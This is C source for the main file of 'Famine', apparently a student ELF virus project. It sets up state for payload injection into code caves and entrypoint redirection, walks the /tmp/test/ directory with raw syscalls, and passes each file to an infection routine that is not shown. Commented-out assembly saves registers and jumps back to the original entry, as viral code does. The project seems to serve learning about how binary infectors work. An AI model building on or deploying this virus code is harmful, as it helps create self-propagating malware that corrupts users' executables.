#include "../includes/famine.h"

void clear_env(t_env *env)
{
	if (env->obj_cpy)
		free(env->obj_cpy);
	if (env->payload_content)
		free(env->payload_content);
	/*if (env->obj_name) {
		free(env->obj_name);
	}*/
	//free(env);
}


t_env env;
t_env *set_env() {
	// create env
	/*if ((env = (t_env *)malloc(sizeof(t_env))) == NULL) {
		if (DEBUG) printf("Error: can't allocate memory.\n");
		return NULL;
	}*/
	env.obj = NULL;
	//env.obj_name = NULL;
	env.obj_cpy = NULL;
	env.obj_size = 0;
	env.new_obj_size = 0;
	env.obj_base = 0;
	env.payload_file = NULL;
	env.payload_content = NULL;
	env.payload_size = 0;
	env.load_align = 0;
	env.entrypoint = 0;
	env.plt_offset = 0;
	env.found_code_cave = 0;
	env.found_code_cave_id = 0;
	env.inject_offset = 0;
	env.inject_addr = 0;

	return &env;
}


int listdir(char *target) {
	int d;
	struct dirent dir = {0};
	
	d = syscall_openat(AT_FDCWD, target, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC);
	if (d > 0) {
		while (syscall_getdents(d, &dir, sizeof(struct dirent)) > 0) {
			if (ft_strcmp(dir.d_name, ".") != 0 && ft_strcmp(dir.d_name, "..") != 0) {
				t_env *env = NULL;
				if ((env = set_env()) == NULL) {
					return -1;
				}
				ft_bzero(env->obj_name, 1024);
				ft_strcpy(env->obj_name, target);
				ft_strcat(env->obj_name, dir.d_name);
				read_obj(env);
				clear_env(env);
			}
		}
		//free(dir);
		close(d);
	}
	return 0;
}

int main(void) {
	/*__asm__(
		// save registers
		"push %rax \n"
		"push %rcx \n"
		"push %rdx \n"
		"push %rbx \n"
		"push %rsi \n"
		"push %rdi \n"
		"push %rbp \n"
		"push %r8 \n"
		"push %r9 \n"
		"push %r10 \n"
		"push %r11 \n"
		"push %r12 \n"
		"push %r13 \n"
		"push %r14 \n"
		"push %r15 \n"
	);*/

	//if (DEBUG) printf("%s\n", "Famine version 1.0 (c)oded by eparisot");
	char* str = "Famine version 1.0 (c)oded by eparisot\n";
	syscall_write(1, str, 39);


	listdir("/tmp/test/");
	//listdir("/tmp/test2/");

	/*__asm__(
		// restore used registers
		"pop %r15 \n"	
		"pop %r14 \n"
		"pop %r13 \n"
		"pop %r12 \n"
		"pop %r11 \n"				 
		"pop %r10 \n"
		"pop %r9 \n"
		"pop %r8 \n"
		"pop %rbp \n"
		"pop %rdi \n"
		"pop %rsi \n"
		"pop %rbx \n"
		"pop %rdx \n"
		"pop %rcx \n"
		"pop %rax \n"
		// restore stack pointer (because of func call)
		//"add $0x8, %rsp \n"
		// jump back to main
		"jmp . + 5 + 0x42424242 \n"
	);*/
	return 0;
}